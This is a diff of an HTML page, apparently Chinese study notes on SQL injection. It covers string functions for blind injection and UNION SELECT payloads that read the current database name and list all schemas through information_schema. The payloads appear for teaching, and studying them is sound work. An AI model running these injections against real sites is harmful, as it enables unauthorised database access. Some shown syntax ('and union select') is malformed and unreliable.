@@ -38,8 +38,7 @@ substr(a,b,c)从b位置开始，截取字符串a的c长度
 
 mid(a,b,c)从位置b开始，截取a字符串的c位
 
-regexp、like语句</code></pre><p>#UNION SELECT</p>
-<p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p>
+regexp、like语句</code></pre><h1 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h1><p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p>
 <p><em>查询当前数据库：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,database()--+</code></pre><p><em>查询所有数据库：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p>
